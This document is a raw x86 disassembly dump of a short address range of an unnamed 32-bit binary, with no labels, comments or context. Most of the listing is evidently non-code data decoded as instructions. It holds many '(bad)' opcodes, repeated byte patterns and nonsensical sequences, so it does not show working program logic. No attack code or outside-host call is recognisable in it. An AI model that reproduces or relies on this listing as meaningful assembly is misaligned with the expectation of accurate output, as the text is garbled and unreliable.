  40bf89:	std    
  40bf8a:	repnz add BYTE PTR [edx+ebx*4-0x6260ff9d],bl
  40bf92:	je     0x40bf94
  40bf94:	loop   0x40bf88
  40bf96:	(bad)  
  40bf97:	add    BYTE PTR [ecx],ch
  40bf99:	stos   BYTE PTR es:[edi],al
  40bf9a:	and    DWORD PTR [eax],eax
  40bf9c:	and    DWORD PTR [ebp-0x5fffffdb],ebp
  40bfa2:	pop    es
  40bfa3:	add    BYTE PTR [esi],bl
  40bfa5:	mov    cl,0x2c
  40bfa7:	add    BYTE PTR [ecx],dh
  40bfa9:	ret    
  40bfaa:	inc    edx
  40bfab:	add    BYTE PTR [ebx-0x1a],dl
  40bfae:	imul   eax,DWORD PTR [eax],0x5d
  40bfb1:	loopne 0x40bf68
  40bfb3:	add    BYTE PTR [ebp+ebp*2+0x6d],ch
  40bfb7:	add    BYTE PTR [edi+0x3600a8a8],ah
  40bfbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfbe:	retf   0x6100
  40bfc1:	lods   eax,DWORD PTR ds:[esi]
  40bfc2:	cmc    
  40bfc3:	add    dl,ch
  40bfc5:	icebp  
  40bfc6:	clc    
  40bfc7:	add    BYTE PTR [edi+edi*4-0x292aff3e],bh
  40bfce:	xlat   BYTE PTR ds:[ebx]
  40bfcf:	add    BYTE PTR [edx],bh
  40bfd1:	xchg   esi,eax
  40bfd2:	sti    
  40bfd3:	add    dl,ah
  40bfd5:	in     al,0xe9
  40bfd7:	add    BYTE PTR [ecx-0xff4d4f],dh
  40bfdd:	(bad)  
  40bfde:	inc    DWORD PTR [eax]
  40bfe0:	mov    dh,0xc6
  40bfe3:	add    BYTE PTR [esi+0xbebe],bh
  40bfe9:	add    BYTE PTR [eax],al
  40bfeb:	add    BYTE PTR [ebx-0x71ff6c6d],dl
  40bff1:	mov    cs,WORD PTR [esi-0x73737400]
  40bff7:	add    BYTE PTR [esp+eax*4+0x7d7d0084],al
  40bffe:	jge    0x40c000
  40c000:	jbe    0x40c078
  40c002:	jbe    0x40c004
  40c004:	jae    0x40c079
  40c006:	jae    0x40c008
  40c008:	outs   dx,BYTE PTR ds:[esi]
  40c009:	outs   dx,BYTE PTR ds:[esi]
  40c00a:	outs   dx,BYTE PTR ds:[esi]
  40c00b:	add    BYTE PTR [edx+0x62],ah
  40c00e:	bound  eax,QWORD PTR [eax]
  40c010:	push   edi
  40c011:	push   edi
  40c012:	push   edi
  40c013:	add    BYTE PTR [eax+0x50],dl
  40c016:	push   eax
  40c017:	add    BYTE PTR [ebx+0x4b],cl
  40c01a:	dec    ebx
  40c01b:	add    BYTE PTR [edx],bh
  40c01d:	cmp    bh,BYTE PTR [edx]
  40c01f:	add    BYTE PTR [esp+esi*1],dh
  40c022:	xor    al,0x0
  40c024:	das    
  40c025:	das    
  40c026:	das    
  40c027:	add    BYTE PTR [esi],ch
  40c029:	cs add BYTE PTR cs:0xff002d2d,ch
  40c031:	(bad)  
  40c032:	inc    DWORD PTR [eax]
	...
  40c148:	add    eax,DWORD PTR [ebx]
  40c14a:	add    esi,DWORD PTR [ecx+0x3afafb3]
  40c150:	add    ebp,DWORD PTR [edi+0x3afb0ae]
  40c156:	add    eax,DWORD PTR [ebx]
  40c158:	add    eax,DWORD PTR [ebx]
  40c15a:	lods   al,BYTE PTR ds:[esi]
  40c15b:	pusha  
  40c15c:	pop    es
  40c15d:	inc    ebp
  40c15e:	jb     0x40c1b4
  40c160:	sub    al,0x2d
  40c162:	xor    al,0x36
  40c164:	cmp    BYTE PTR [ecx-0x63fcfcfd],bh
  40c16a:	popa   
  40c16b:	nop
  40c16c:	xchg   ebx,eax
  40c16d:	mov    gs,WORD PTR [ebx+0x4e]
  40c170:	sbb    DWORD PTR [esi],ebp
  40c172:	cmp    bh,BYTE PTR [esi]
  40c174:	cmp    al,0x31
  40c176:	mov    eax,0x41a40303
  40c17b:	(bad)  
  40c17c:	xchg   ebp,eax
  40c17d:	xchg   esp,eax
  40c17e:	xchg   ecx,eax
  40c17f:	adc    eax,0x3b292521
  40c184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c185:	cmp    eax,0xa403af39
  40c18a:	push   eax
  40c18b:	lea    ebx,[eax+0x22139296]
  40c191:	adc    cl,BYTE PTR [edx]
  40c193:	or     al,0xa5
  40c195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c196:	aaa    
  40c197:	mov    dh,0x3
  40c199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c19a:	push   ebp
  40c19b:	mov    ebx,DWORD PTR [ecx+0x1c166597]
  40c1a1:	or     ecx,DWORD PTR [ebx+0xf]
  40c1a4:	pop    ecx
  40c1a5:	pop    edi
  40c1a6:	dec    eax
  40c1a7:	mov    bh,0x3
  40c1a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1aa:	inc    ebx
  40c1ab:	mov    DWORD PTR [edx+0x1f4a099d],ebx
  40c1b1:	push   es
  40c1b2:	pop    ebx
  40c1b3:	push   ds
  40c1b4:	xor    eax,0x3b53347
  40c1b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ba:	test   DWORD PTR [eax-0x62],esi
  40c1bd:	mov    ds:0x4425701,al
  40c1c2:	or     BYTE PTR [eax],dl
  40c1c4:	and    BYTE PTR [edi],ah
  40c1c6:	sbb    ebp,DWORD PTR [edi+0x6f7b7e03]
  40c1cc:	outs   dx,BYTE PTR ds:[esi]
  40c1cd:	jns    0x40c221
  40c1cf:	add    ah,BYTE PTR [ebp+0x241a1140]
  40c1d5:	and    ebp,DWORD PTR [ebx]
  40c1d7:	add    eax,DWORD PTR [ebx]
  40c1d9:	ja     0x40c251
  40c1db:	jge    0x40c259
  40c1dd:	xor    BYTE PTR [ebx+0x63],0x5
  40c1e1:	push   cs
  40c1e2:	pop    ss
  40c1e3:	xor    ch,BYTE PTR [eax]
  40c1e5:	add    eax,DWORD PTR es:[ebx]
  40c1e8:	add    esp,DWORD PTR [eax-0x7d787978]
  40c1ee:	cmp    DWORD PTR [edx+0x6d],0x302f5d67
  40c1f5:	add    eax,DWORD PTR [ebx]
  40c1f7:	add    eax,DWORD PTR [ebx]
  40c1f9:	mov    eax,ds:0x44005e6a
  40c1fe:	jno    0x40c18c
  40c200:	mov    al,BYTE PTR [ebx+eax*4+0x3030358]
  40c207:	add    eax,DWORD PTR [ebx]
  40c209:	dec    ebp
  40c20a:	push   bx
  40c20c:	dec    ecx
  40c20d:	sub    bl,BYTE PTR ds:0xa39f0d14
  40c213:	fwait
  40c214:	add    eax,DWORD PTR [ebx]
  40c216:	add    eax,DWORD PTR [ebx]
  40c218:	dec    ebp
  40c219:	mov    BYTE PTR [eax+0x74],bh
  40c21c:	push   0x4f515a62
  40c221:	cmp    edi,DWORD PTR [edi]
  40c223:	mov    dl,0xb4
  40c225:	add    eax,DWORD PTR [ebx]
  40c227:	add    ecx,DWORD PTR [ebp+0x7f]
  40c22a:	jne    0x40c298
  40c22c:	imul   esp,DWORD PTR [esp+ebx*2+0x56],0xa646184c
  40c234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c235:	add    eax,DWORD PTR [ebx]
  40c237:	add    ecx,DWORD PTR [ebp+0x4d]
  40c23a:	dec    ebp
  40c23b:	dec    ebp
  40c23c:	dec    ebp
  40c23d:	dec    ebp
  40c23e:	dec    ebp
  40c23f:	dec    ebp
  40c240:	dec    ebp
  40c241:	dec    ebp
  40c242:	dec    ebp
  40c243:	dec    ebp
  40c244:	add    eax,DWORD PTR [ebx]
  40c246:	add    eax,DWORD PTR [ebx]
  40c248:	loope  0x40c1d1
  40c24a:	cmc    
  40c24b:	out    dx,al
  40c24c:	rol    BYTE PTR [ebx],0x97
  40c24f:	mov    ebp,0xc5c70180
  40c254:	add    BYTE PTR [eax],0x2c
  40c257:	and    eax,0xa1e0080
  40c25c:	add    BYTE PTR [eax],0x14
  40c25f:	in     al,dx
  40c260:	add    BYTE PTR [eax],0xec
  40c263:	in     al,dx
  40c264:	add    BYTE PTR [eax],0xfd
  40c267:	add    DWORD PTR [eax-0x7f110aff],eax
  40c26d:	add    ebx,DWORD PTR [edi-0x38f87f43]
  40c273:	lds    eax,FWORD PTR [eax-0x7fd3e4f1]
  40c279:	movups xmm0,XMMWORD PTR ds:0x6050700
  40c280:	add    BYTE PTR [edi],al
  40c282:	push   edi
  40c283:	push   edi
  40c284:	add    BYTE PTR [edi],cl
  40c286:	inc    esi
  40c287:	sub    BYTE PTR ds:[eax],al
  40c28a:	add    BYTE PTR [eax],al
  40c28c:	xor    BYTE PTR [eax],al
  40c28e:	add    BYTE PTR [eax],al
  40c290:	pusha  
  40c291:	add    BYTE PTR [eax],al
  40c293:	add    BYTE PTR [ecx],al
  40c295:	add    BYTE PTR [eax],ah
	...
  40c2cb:	add    eax,0x1d000000
  40c2d0:	add    BYTE PTR [eax],al
  40c2d2:	add    BYTE PTR [ebx+0x0],cl
  40c2d5:	add    BYTE PTR [eax],al
  40c2d7:	jo     0x40c2d9
  40c2d9:	add    BYTE PTR [eax],al
  40c2db:	ins    DWORD PTR es:[edi],dx
  40c2dc:	add    BYTE PTR [eax],al
  40c2de:	add    BYTE PTR [eax+0x0],bl
  40c2e1:	add    BYTE PTR [eax],al
  40c2e3:	aas    
  40c2e4:	add    BYTE PTR [eax],al
  40c2e6:	add    BYTE PTR [ebx],ch
  40c2e8:	add    BYTE PTR [eax],al
  40c2ea:	add    BYTE PTR [edi],bl
  40c2ec:	add    BYTE PTR [eax],al
  40c2ee:	add    BYTE PTR ds:0xc000000,dl
  40c2f4:	add    BYTE PTR [eax],al
  40c2f6:	add    BYTE PTR [eax+eax*1],al
  40c2f9:	add    BYTE PTR [eax],al
  40c2fb:	add    DWORD PTR [eax],eax
  40c2fd:	add    BYTE PTR [eax],al
  40c2ff:	add    DWORD PTR [eax],eax
	...
  40c31d:	add    BYTE PTR [eax],al
  40c31f:	add    al,BYTE PTR [eax]
  40c321:	add    BYTE PTR [eax],al
  40c323:	or     al,BYTE PTR [eax]
  40c325:	add    BYTE PTR [eax],al
  40c327:	adc    al,0x0
  40c329:	add    BYTE PTR [eax],al
  40c32b:	sbb    al,0x0
  40c32d:	add    BYTE PTR [eax],al
  40c32f:	pop    ds
  40c330:	add    BYTE PTR [eax],al
  40c332:	add    BYTE PTR [edi],bl
  40c334:	add    BYTE PTR [eax],al
  40c336:	add    BYTE PTR [edi],bl
  40c338:	add    BYTE PTR [eax],al
  40c33a:	add    BYTE PTR [ebx],bl
  40c33c:	add    BYTE PTR [eax],al
  40c33e:	add    BYTE PTR [ebx],dl
  40c340:	add    BYTE PTR [eax],al
  40c342:	add    BYTE PTR [ecx],cl
  40c344:	add    BYTE PTR [eax],al
  40c346:	add    BYTE PTR [edx],al
	...
  40c380:	add    BYTE PTR [eax],al
  40c382:	add    BYTE PTR [ecx],al
  40c384:	add    BYTE PTR [eax],al
  40c386:	add    BYTE PTR [ecx],cl
  40c388:	add    BYTE PTR [eax],al
  40c38a:	add    BYTE PTR [esi],ah
  40c38c:	cmp    BYTE PTR [eax],bh
  40c38e:	cmp    BYTE PTR [edx-0x13a5a5a6],dl
  40c394:	dec    eax
  40c395:	dec    eax
  40c396:	dec    eax
  40c397:	loope  0x40c3cf
  40c399:	ss rcr BYTE PTR ss:[ebx],cl
  40c39d:	sbb    ebx,DWORD PTR [ebx]
  40c39f:	mov    bh,0x0
  40c3a1:	add    BYTE PTR [eax],al
  40c3a3:	pushf  
  40c3a4:	add    BYTE PTR [eax],al
  40c3a6:	add    BYTE PTR [esi+0x79000000],cl
  40c3ac:	add    BYTE PTR [eax],al
  40c3ae:	add    BYTE PTR [eax+0x0],ah
  40c3b1:	add    BYTE PTR [eax],al
  40c3b3:	inc    esi
  40c3b4:	add    BYTE PTR [eax],al
  40c3b6:	add    BYTE PTR [ecx],dh
  40c3b8:	add    BYTE PTR [eax],al
  40c3ba:	add    BYTE PTR [ebx],ah
  40c3bc:	add    BYTE PTR [eax],al
  40c3be:	add    BYTE PTR [ecx],bl
  40c3c0:	add    BYTE PTR [eax],al
  40c3c2:	add    BYTE PTR [eax],dl
  40c3c4:	add    BYTE PTR [eax],al
  40c3c6:	add    BYTE PTR [edi],al
  40c3c8:	add    BYTE PTR [eax],al
  40c3ca:	add    BYTE PTR [ecx],al
  40c3cc:	add    BYTE PTR [eax],al
  40c3ce:	add    BYTE PTR [ecx],al
  40c3d0:	add    BYTE PTR [eax],al
  40c3d2:	add    BYTE PTR [ecx],al
  40c3d4:	add    BYTE PTR [eax],al
  40c3d6:	add    BYTE PTR [eax+eax*1],al
  40c3d9:	add    BYTE PTR [eax],al
  40c3db:	adc    DWORD PTR [eax],eax
  40c3dd:	add    BYTE PTR [eax],al
  40c3df:	add    BYTE PTR es:[eax],al
  40c3e2:	add    BYTE PTR [eax+0x0],al
  40c3e5:	add    BYTE PTR [eax],al
  40c3e7:	pop    ebp
  40c3e8:	add    BYTE PTR [eax],al
  40c3ea:	add    BYTE PTR [eax+0x0],dh
  40c3ed:	add    BYTE PTR [eax],al
  40c3ef:	jns    0x40c3f1
  40c3f1:	add    BYTE PTR [eax],al
  40c3f3:	jp     0x40c3f5
  40c3f5:	add    BYTE PTR [eax],al
  40c3f7:	jns    0x40c3f9
  40c3f9:	add    BYTE PTR [eax],al
  40c3fb:	outs   dx,DWORD PTR ds:[esi]
  40c3fc:	add    BYTE PTR [eax],al
  40c3fe:	add    BYTE PTR [ecx+0x0],bl
  40c401:	add    BYTE PTR [eax],al
  40c403:	aas    
  40c404:	add    BYTE PTR [eax],al
  40c406:	add    BYTE PTR [esi],ah
  40c408:	add    BYTE PTR [eax],al
  40c40a:	add    BYTE PTR [ecx],dl
  40c40c:	add    BYTE PTR [eax],al
  40c40e:	add    BYTE PTR [eax+eax*1],al
	...
  40c43d:	add    BYTE PTR [eax],al
  40c43f:	add    al,BYTE PTR [eax]
  40c441:	add    BYTE PTR [eax],al
  40c443:	or     eax,0x33000000
  40c448:	dec    eax
  40c449:	dec    eax
  40c44a:	dec    eax
  40c44b:	mov    bh,0x7a
  40c44d:	jp     0x40c4c9
  40c44f:	(bad)  
  40c450:	(bad)  
  40c452:	fcos   
  40c454:	iret   
  40c455:	iret   
  40c456:	iret   
  40c457:	push   DWORD PTR [ebx-0x72004c4d]
  40c45d:	lea    ecx,[ebp+0x626262ff]
  40c463:	sti    
  40c464:	push   ebx
  40c465:	push   ebx
  40c466:	push   ebx
  40c467:	out    dx,al
  40c468:	cmp    eax,0x22da3d3d
  40c46d:	and    ah,BYTE PTR [edx]
  40c46f:	mov    edi,0xa60a0a0a
  40c474:	add    BYTE PTR [eax],al
  40c476:	add    BYTE PTR [eax+eax*1+0x800000],dl
  40c47d:	add    BYTE PTR [eax],al
  40c47f:	add    BYTE PTR [bx+si],al
  40c482:	add    BYTE PTR [ecx+0x0],dl
  40c485:	add    BYTE PTR [eax],al
  40c487:	cmp    al,BYTE PTR [eax]
  40c489:	add    BYTE PTR [eax],al
  40c48b:	sub    BYTE PTR [eax],al
  40c48d:	add    BYTE PTR [eax],al
  40c48f:	sbb    eax,0x18000000
  40c494:	add    BYTE PTR [eax],al
  40c496:	add    BYTE PTR [eax],ch
  40c498:	add    BYTE PTR [eax],al
  40c49a:	add    BYTE PTR [ebx+0x30],dl
  40c49d:	and    BYTE PTR [eax],ah
  40c49f:	cdq    
  40c4a0:	pop    edi
  40c4a1:	inc    eax
  40c4a2:	inc    eax
  40c4a3:	int    0x76
  40c4a5:	dec    esi
  40c4a6:	dec    esi
  40c4a7:	in     al,0x7c
  40c4a9:	push   ebx
  40c4aa:	push   ebx
  40c4ab:	jmp    0x40c529
  40c4ad:	push   edx
  40c4ae:	push   edx
  40c4af:	in     al,dx
  40c4b0:	jl     0x40c504
  40c4b2:	push   edx
  40c4b3:	in     al,dx
  40c4b4:	je     0x40c503
  40c4b6:	dec    ebp
  40c4b7:	out    0x52,eax
  40c4b9:	ss shr BYTE PTR ss:[eax],cl
  40c4bd:	sbb    ebx,DWORD PTR [ebx]
  40c4bf:	mov    eax,0x9a000000
  40c4c4:	add    BYTE PTR [eax],al
  40c4c6:	add    BYTE PTR [ecx+0x53000000],al
  40c4cc:	add    BYTE PTR [eax],al
  40c4ce:	add    BYTE PTR [edi],ah
  40c4d0:	add    BYTE PTR [eax],al
  40c4d2:	add    BYTE PTR [eax+eax*1],cl
  40c4d5:	add    BYTE PTR [eax],al
  40c4d7:	add    al,BYTE PTR [eax]
	...
  40c4f9:	add    BYTE PTR [eax],al
  40c4fb:	add    DWORD PTR [eax],eax
  40c4fd:	add    BYTE PTR [eax],al
  40c4ff:	adc    BYTE PTR [esi],dl
  40c501:	push   ss
  40c502:	push   ss
  40c503:	dec    esp
  40c504:	push   ebp
  40c505:	push   ebp
  40c506:	push   ebp
  40c507:	xlat   BYTE PTR ds:[ebx]
  40c508:	xchg   ebp,eax
  40c509:	xchg   ebp,eax
  40c50a:	xchg   ebp,eax
  40c50b:	dec    esi
  40c50d:	into   
  40c50e:	into   
  40c50f:	jmp    esi
  40c511:	in     eax,0xe4
  40c513:	(bad)  
  40c514:	(bad)  
  40c515:	std    
  40c516:	cli    
  40c517:	(bad)  
  40c518:	(bad)  
  40c519:	std    
  40c51a:	cli    
  40c51b:	(bad)  
  40c51c:	(bad)  
  40c51d:	std    
  40c51e:	cli    
  40c51f:	(bad)  
  40c520:	(bad)  
  40c521:	std    
  40c522:	cli    
  40c523:	(bad)  
  40c524:	(bad)  
  40c526:	aad    0xff
  40c528:	mov    ebp,0x97ffbabc
  40c52d:	xchg   esi,eax
  40c52e:	xchg   ebp,eax
  40c52f:	(bad)  
  40c530:	jnp    0x40c5ac
  40c532:	jp     0x40c533
  40c534:	pop    ecx
  40c535:	pop    ecx
  40c536:	pop    ecx
  40c537:	repz inc ebx
  40c539:	inc    ebx
  40c53a:	inc    ebx
  40c53b:	fbstp  TBYTE PTR [ecx]
  40c53d:	xor    DWORD PTR [ecx],esi
  40c53f:	int3   
  40c540:	adc    edx,DWORD PTR [ebx]
  40c542:	adc    ebp,DWORD PTR [edi-0x66000000]
  40c548:	add    BYTE PTR [eax],al
  40c54a:	add    BYTE PTR [ebx+0x74000000],cl
  40c550:	add    BYTE PTR [eax],al
  40c552:	add    BYTE PTR [edi+0x55],ah
  40c555:	cmp    DWORD PTR [ecx],edi
  40c557:	lods   eax,DWORD PTR ds:[esi]
  40c558:	mov    WORD PTR [esi+0x5e],ds
  40c55b:	repz pushf 
  40c55d:	ins    BYTE PTR es:[edi],dx
  40c55e:	ins    BYTE PTR es:[edi],dx
  40c55f:	(bad)  
  40c560:	mov    edi,0xcfff8b8b
  40c565:	mov    ds:0xbbe6ffa2,al
  40c56a:	mov    ebx,0xbfbfe6ff
  40c56f:	jmp    esi
  40c571:	ret    
  40c572:	ret    
  40c573:	inc    esi
  40c575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c577:	push   DWORD PTR [esi-0x69007071]
  40c57d:	data16 dec WORD PTR [edx+0x46f75c5c]
  40c585:	das    
  40c586:	das    
  40c587:	rol    DWORD PTR [eax],1
  40c589:	add    BYTE PTR [eax],al
  40c58b:	mov    eax,ds:0x7a000000
  40c590:	add    BYTE PTR [eax],al
  40c592:	add    BYTE PTR [ebx+0x0],al
  40c595:	add    BYTE PTR [eax],al
  40c597:	pop    ss
  40c598:	add    BYTE PTR [eax],al
  40c59a:	add    BYTE PTR [eax+eax*1],al
	...
  40c5b1:	add    BYTE PTR [eax],al
  40c5b3:	add    bh,bh
  40c5b5:	(bad)  
  40c5b6:	inc    DWORD PTR [eax]
  40c5b8:	add    BYTE PTR [eax],al
  40c5ba:	add    BYTE PTR [esi],al
  40c5bc:	cmp    edi,DWORD PTR [ebx]
  40c5be:	cmp    edx,DWORD PTR [ebp+0x65]
  40c5c1:	gs gs out 0xb1,eax
  40c5c5:	mov    cl,0xb1
  40c5c7:	call   ecx
  40c5c9:	rcl    ecx,1
  40c5cb:	call   eax
  40c5cd:	rcl    al,1
  40c5cf:	jmp    edi
  40c5d1:	in     al,0xe2
  40c5d3:	(bad)  
  40c5d4:	(bad)  
  40c5d5:	cli    
  40c5d6:	idiv   bh
  40c5d8:	(bad)  
  40c5d9:	cli    
  40c5da:	idiv   bh
  40c5dc:	(bad)  
  40c5dd:	cli    
  40c5de:	idiv   bh
  40c5e0:	(bad)  
  40c5e1:	cli    
  40c5e2:	idiv   bh
  40c5e4:	(bad)  
  40c5e5:	cli    
  40c5e6:	idiv   bh
  40c5e8:	(bad)  
  40c5e9:	cli    
  40c5ea:	idiv   bh
  40c5ec:	(bad)  
  40c5ed:	cli    
  40c5ee:	idiv   bh
  40c5f0:	(bad)  
  40c5f1:	cli    
  40c5f2:	idiv   bh
  40c5f4:	in     al,dx
  40c5f5:	call   0xc408c5de
  40c5fa:	sar    edi,0xaa
  40c5fd:	popf   
  40c5fe:	(bad)  
  40c5ff:	inc    DWORD PTR [ebp+0x64ff787e]
  40c605:	fs fs sti 
  40c608:	dec    edi
  40c609:	dec    edi
  40c60a:	dec    edi
  40c60b:	jmp    0xd477fd4f
  40c610:	jge    0x40c665
  40c612:	push   ebx
  40c613:	jmp    0x9ad9:0xff7070a6
  40c61a:	call   0xffff:0xc0c0ffff
  40c621:	mov    edi,0xcbcbffff
  40c627:	(bad)  
  40c628:	call   edx
  40c62a:	sar    bh,cl
  40c62c:	(bad)  
  40c62d:	fcomp  st(0)
  40c62f:	(bad)  
  40c630:	(bad)  
  40c631:	fstp   st(5)
  40c633:	(bad)  
  40c634:	jmp    ebx
  40c636:	jecxz  0x40c637
  40c638:	(bad)  
  40c639:	call   0xe636c626
  40c63e:	in     eax,0xff
  40c640:	fnstcw WORD PTR [esi+0x78a6ffbe]
  40c646:	js     0x40c647
  40c648:	adc    BYTE PTR [edi+0x57],0xf3
  40c64c:	sbb    bl,BYTE PTR es:[edx]
  40c64f:	rol    BYTE PTR [eax],0x0
  40c652:	add    BYTE PTR [edx+0x54000000],dl
  40c658:	add    BYTE PTR [eax],al
  40c65a:	add    BYTE PTR [eax+eax*1],bl
  40c65d:	add    BYTE PTR [eax],al
  40c65f:	add    al,0x0
	...
  40c671:	add    BYTE PTR [eax],al
  40c673:	add    bh,bh
  40c675:	(bad)  
  40c676:	inc    DWORD PTR [eax]
  40c678:	push   ebx
  40c679:	push   ebx
  40c67a:	push   ebx
  40c67b:	sub    DWORD PTR [ebp+0x7d],edi
  40c67e:	jge    0x40c673
  40c680:	mov    edi,0xd3d3ffc7
  40c686:	sar    edi,cl
  40c688:	retf   
  40c689:	retf   
  40c68a:	retf   
  40c68b:	dec    edx
  40c68d:	retf   0xffca
  40c690:	call   0x40a879
  40c695:	clc    
  40c696:	icebp  
  40c697:	(bad)  
  40c698:	(bad)  
  40c699:	clc    
  40c69a:	icebp  
  40c69b:	(bad)  
  40c69c:	(bad)  
  40c69d:	clc    
  40c69e:	icebp  
  40c69f:	(bad)  
  40c6a0:	(bad)  
  40c6a1:	clc    
  40c6a2:	icebp  
  40c6a3:	(bad)  
  40c6a4:	(bad)  
  40c6a5:	clc    
  40c6a6:	icebp  
  40c6a7:	(bad)  
  40c6a8:	(bad)  
  40c6a9:	clc    
  40c6aa:	icebp  
  40c6ab:	(bad)  
  40c6ac:	(bad)  
  40c6ad:	clc    
  40c6ae:	icebp  
  40c6af:	(bad)  
  40c6b0:	(bad)  
  40c6b1:	clc    
  40c6b2:	icebp  
  40c6b3:	(bad)  
  40c6b4:	(bad)  
  40c6b5:	clc    
  40c6b6:	icebp  
  40c6b7:	(bad)  
  40c6b8:	jmp    edi
  40c6ba:	sar    bh,1
  40c6bc:	dec    esp
  40c6be:	cdq    
  40c6bf:	(bad)  
  40c6c0:	dec    esp
  40c6c2:	cdq    
  40c6c3:	(bad)  
  40c6c4:	dec    esi
  40c6c6:	lahf   
  40c6c7:	inc    esi
  40c6c9:	mov    al,ds:0x6696ff83
  40c6ce:	data16 (bad) 
  40c6d0:	mov    esp,0xf9ff7f7f
  40c6d5:	stos   DWORD PTR es:[edi],eax
  40c6d6:	stos   DWORD PTR es:[edi],eax
  40c6d7:	(bad)  
  40c6d8:	push   DWORD PTR [ebp-0x4500004b]
  40c6de:	mov    edx,0xc0c0ffff
  40c6e3:	(bad)  
  40c6e4:	inc    edi
  40c6e6:	(bad)  
  40c6e7:	(bad)  
  40c6e8:	dec    ebx
  40c6ea:	retf   
  40c6eb:	(bad)  
  40c6ec:	call   edx
  40c6ee:	sar    bh,cl
  40c6f0:	(bad)  
  40c6f1:	fcomp  st(0)
  40c6f3:	(bad)  
  40c6f4:	(bad)  
  40c6f5:	fstp   st(5)
  40c6f7:	(bad)  
  40c6f8:	jmp    ebx
  40c6fa:	jecxz  0x40c6fb
  40c6fc:	(bad)  
  40c6fd:	call   0xef40c6ea
  40c702:	out    dx,al
  40c703:	(bad)  
  40c704:	(bad)  
  40c705:	sti    
  40c706:	sti    
  40c707:	dec    esp
  40c709:	mov    bl,0xb3
  40c70b:	call   FWORD PTR [ecx+0x46ff6666]
  40c711:	cs rol DWORD PTR cs:[eax],cl
  40c715:	add    BYTE PTR [eax],al
  40c717:	cwde   
  40c718:	add    BYTE PTR [eax],al
  40c71a:	add    BYTE PTR [esi+0x0],dl
  40c71d:	add    BYTE PTR [eax],al
  40c71f:	sbb    al,0x0
  40c721:	add    BYTE PTR [eax],al
  40c723:	add    al,0x0
	...
  40c731:	add    BYTE PTR [eax],al
  40c733:	add    bh,bh
  40c735:	(bad)  
  40c736:	inc    DWORD PTR [eax]
  40c738:	pusha  
  40c739:	pusha  
  40c73a:	pusha  
  40c73b:	dec    eax
  40c73c:	mov    eax,ds:0xd6ffa1a1
  40c741:	(bad)  
  40c742:	(bad)  
  40c743:	(bad)  
  40c744:	mov    ebx,0x9dffbbbb
  40c749:	popf   
  40c74a:	popf   
  40c74b:	inc    eax
  40c74d:	rol    al,0xff
  40c750:	call   0x40a739
  40c755:	imul   ah
  40c757:	(bad)  
  40c758:	push   esi
  40c75a:	in     al,dx
  40c75b:	(bad)  
  40c75c:	push   esi
  40c75e:	in     al,dx
  40c75f:	(bad)  
  40c760:	push   esi
  40c762:	in     al,dx
  40c763:	(bad)  
  40c764:	push   esi
  40c766:	in     al,dx
  40c767:	(bad)  
  40c768:	push   esi
  40c76a:	in     al,dx
  40c76b:	(bad)  
  40c76c:	push   esi
  40c76e:	in     al,dx
  40c76f:	(bad)  
  40c770:	push   esi
  40c772:	in     al,dx
  40c773:	(bad)  
  40c774:	push   ebx
  40c776:	out    0xff,eax
  40c778:	dec    esp
  40c77a:	sahf   
  40c77b:	(bad)  
  40c77c:	dec    edx
  40c77e:	cdq    
  40c77f:	(bad)  
  40c780:	dec    edx
  40c782:	cdq    
  40c783:	(bad)  
  40c784:	in     al,dx
  40c785:	mov    bh,0x8f
  40c787:	call   FWORD PTR [edi-0x26009694]
  40c78d:	mov    DWORD PTR [ecx-0x5b5b0001],ecx
  40c793:	(bad)  
  40c794:	jmp    FWORD PTR [edx-0x4f000056]
  40c79a:	mov    al,0xff
  40c79c:	push   DWORD PTR [ebp-0x4500004b]
  40c7a2:	mov    edx,0xc0c0ffff
  40c7a7:	(bad)  
  40c7a8:	inc    edi
  40c7aa:	(bad)  
  40c7ab:	(bad)  
  40c7ac:	dec    ebx
  40c7ae:	retf   
  40c7af:	(bad)  
  40c7b0:	call   edx
  40c7b2:	sar    bh,cl
  40c7b4:	(bad)  
  40c7b5:	fcomp  st(0)
  40c7b7:	(bad)  
  40c7b8:	(bad)  
  40c7b9:	fstp   st(5)
  40c7bb:	(bad)  
  40c7bc:	jmp    ebx
  40c7be:	jecxz  0x40c7bf
  40c7c0:	(bad)  
  40c7c1:	jmp    0x40c7af
  40c7c6:	(bad)  
  40c7c7:	(bad)  
  40c7c8:	(bad)  
  40c7c9:	(bad)  
  40c7ca:	(bad)  
  40c7cb:	(bad)  
  40c7cc:	in     al,dx
  40c7cd:	loop   0x40c7b1
  40c7cf:	call   FWORD PTR [edi+0x46ff7070]
  40c7d5:	cs rol DWORD PTR cs:[eax],cl
  40c7d9:	add    BYTE PTR [eax],al
  40c7db:	xchg   edi,eax
  40c7dc:	add    BYTE PTR [eax],al
  40c7de:	add    BYTE PTR [ebx+0x0],dl
  40c7e1:	add    BYTE PTR [eax],al
  40c7e3:	push   ss
  40c7e4:	add    BYTE PTR [eax],al
  40c7e6:	add    BYTE PTR [edx],al
	...
  40c7f4:	(bad)  
  40c7f5:	(bad)  
  40c7f6:	inc    DWORD PTR [eax]
  40c7f8:	popa   
  40c7f9:	popa   
  40c7fa:	popa   
  40c7fb:	dec    eax
  40c7fc:	mov    ds:0xb5ffa3a3,eax
  40c801:	mov    ch,0xb5
  40c803:	jmp    DWORD PTR [ecx-0x39005e5f]
  40c809:	mov    dh,0xff
  40c80c:	rcl    ebx,cl
  40c80e:	sar    edi,cl
  40c810:	jmp    0x40a5f8
  40c815:	repz call 0xe934c81a
  40c81b:	(bad)  
  40c81c:	push   ebx
  40c81e:	call   0x49f61922
  40c823:	inc    DWORD PTR [eax-0x40008b3a]
  40c829:	(bad)  [esi-0x160e0901]
  40c82f:	(bad)  
  40c830:	push   ebx
  40c832:	call   0xcb24c836
  40c837:	(bad)  
  40c838:	dec    eax
  40c83a:	cdq    
  40c83b:	(bad)  
  40c83c:	dec    eax
  40c83e:	cdq    
  40c83f:	(bad)  
  40c840:	stc    
  40c841:	ret    0xff96
  40c844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
